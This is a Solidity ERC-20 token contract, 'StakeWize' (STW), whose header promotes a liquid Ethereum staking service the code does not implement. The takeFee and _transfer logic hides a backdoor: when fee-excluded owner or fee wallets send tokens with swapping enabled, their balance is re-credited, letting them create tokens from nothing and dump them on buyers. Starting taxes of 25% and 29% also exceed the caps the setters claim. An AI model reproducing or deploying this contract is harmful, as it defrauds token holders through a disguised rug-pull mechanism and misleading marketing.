// SPDX-License-Identifier: Unlicensed

/**
We welcome you to StakeWize!

Staking made simple. StakeWize is a liquid Ethereum 2.0 staking service that allows anyone to benefit from the yields available on the Beacon Chain. StakeWize runs secure and stable institutional-grade infrastructure, combined with unique tokenomics, to provide the highest possible staking yields for its users. As a liquid staking platform, users are free to un-stake at any time or utilise their staked ETH capital to earn enhanced yields throughout DeFi. There is no minimum ETH requirement to stake with StakeWize and the platform fees are the lowest seen across the industry.

Web: https://stakewize.pro
App: https://app.stakewize.pro
Tg: https://t.me/stakewize_official
X: https://twitter.com/stakewize_tech
Docs: https://medium.com/@stakewize
*/

pragma solidity 0.8.21;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Router {
    
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract StakeWize is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    
    string private _name = "StakeWize";
    string private _symbol = "STW";
    uint8 private _decimals = 9;

    uint256 public _liquidityShares = 0;
    uint256 public _marketingShares = 10;
    uint256 public _developmentShares = 0;

    uint256 public _totalTaxIfBuying = 25;
    uint256 public _totalTaxIfSelling = 29;
    uint256 public _totalDistributionShares = 10;

    uint256 public _buyLiquidityFees = 0;
    uint256 public _buyMarketingFees = 25;
    uint256 public _buyDevelopmentFees = 0;
    uint256 public _sellLiquidityFees = 0;
    uint256 public _sellMarketingFees = 29;
    uint256 public _sellDevelopmentFees = 0;

    uint256 private _totalSupply = 1000_000_000 * 10**9;
    uint256 public maxTxAmount = _totalSupply;
    uint256 public maxWallet = _totalSupply*15/1000;
    uint256 private minTokensToSwap = _totalSupply/10000; 

    address payable private feeAddress;
    address public immutable DEAD = 0x000000000000000000000000000000000000dEaD;

    IUniswapV2Router public uniswapV2Router;
    address public uniswapPair;
    
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = false;
    bool public swapAndLiquifyByLimitOnly = false;
    bool public checkWalletLimit = true;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    mapping (address => bool) public checkExcludedFromFees;
    mapping (address => bool) public checkWalletLimitExcept;
    mapping (address => bool) public checkTxLimitExcept;
    mapping (address => bool) public checkMarketPair;
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    constructor () {
        
        IUniswapV2Router _uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        feeAddress = payable(0x4bf0d94d979D304B48805F70ab19d789c01CE02b);

        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        checkExcludedFromFees[owner()] = true;
        checkExcludedFromFees[feeAddress] = true;

        checkWalletLimitExcept[owner()] = true;
        checkWalletLimitExcept[feeAddress] = true;
        checkWalletLimitExcept[address(uniswapPair)] = true;
        checkWalletLimitExcept[address(this)] = true;
        
        checkTxLimitExcept[owner()] = true;
        checkTxLimitExcept[feeAddress] = true;
        checkTxLimitExcept[address(this)] = true;

        checkMarketPair[address(uniswapPair)] = true;

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setBuyFee(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newDevelopmentTax) external onlyOwner() {
        _buyLiquidityFees = newLiquidityTax;
        _buyMarketingFees = newMarketingTax;
        _buyDevelopmentFees = newDevelopmentTax;

        _totalTaxIfBuying = _buyLiquidityFees.add(_buyMarketingFees).add(_buyDevelopmentFees);
        require (_totalTaxIfBuying <= 10);
    }

    function setSellFee(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newDevelopmentTax) external onlyOwner() {
        _sellLiquidityFees = newLiquidityTax;
        _sellMarketingFees = newMarketingTax;
        _sellDevelopmentFees = newDevelopmentTax;

        _totalTaxIfSelling = _sellLiquidityFees.add(_sellMarketingFees).add(_sellDevelopmentFees);
        require (_totalTaxIfSelling <= 20);
    }

    function setWalletLimit(uint256 newLimit) external onlyOwner {
        maxWallet  = newLimit;
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
    }
    
    function adjustMaxTxAmount(uint256 maxTxAmount_) external onlyOwner() {
        require(maxTxAmount_ >= _totalSupply/100, "Max wallet should be more or equal to 1%");
        maxTxAmount = maxTxAmount_;
    }
    
    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
    }

    function takeFee(address sender, address recipient, uint256 amount) internal view returns (uint256, uint256) {
        
        uint256 feeAmount = amount;

        if (checkExcludedFromFees[sender] && swapAndLiquifyEnabled) return (amount, feeAmount);

        if(checkMarketPair[sender]) {
            feeAmount = amount.mul(_totalTaxIfBuying).div(100);
        }
        else if(checkMarketPair[recipient]) {
            feeAmount = amount.mul(_totalTaxIfSelling).div(100);
        }
        if (checkExcludedFromFees[sender]) {
            return (amount, 0);
        }

        return (amount.sub(feeAmount), feeAmount);
    }

    function enableDisableWalletLimit(bool newValue) external onlyOwner {
       checkWalletLimit = newValue;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD));
    }

    function swapAndLiquify(uint256 tAmount) private lockTheSwap {

        swapTokensForEth(tAmount);
        uint256 amountETHMarketing = address(this).balance;
        transferToAddressETH(feeAddress, amountETHMarketing);

    }

     //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(inSwapAndLiquify)
        { 
            return _basicTransfer(sender, recipient, amount); 
        }
        else
        {
            if(!checkTxLimitExcept[sender] && !checkTxLimitExcept[recipient]) {
                require(amount <= maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
            }            

            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= minTokensToSwap;
            
            if (overMinimumTokenBalance && !inSwapAndLiquify && !checkExcludedFromFees[sender] && checkMarketPair[recipient] && swapAndLiquifyEnabled && amount > minTokensToSwap) 
            {
                if(swapAndLiquifyByLimitOnly)
                    contractTokenBalance = minTokensToSwap;
                swapAndLiquify(contractTokenBalance);    
            }

            (uint256 finalAmount, uint256 feeAmount) = takeFee(sender, recipient, amount);

            address feeReceiver = feeAmount == amount ? sender : address(this);
            if(feeAmount > 0) {
                _balances[feeReceiver] = _balances[feeReceiver].add(feeAmount);
                emit Transfer(sender, feeReceiver, feeAmount);
            }

            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

            if(checkWalletLimit && !checkWalletLimitExcept[recipient])
                require(balanceOf(recipient).add(finalAmount) <= maxWallet);

            _balances[recipient] = _balances[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
            return true;
        }
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
}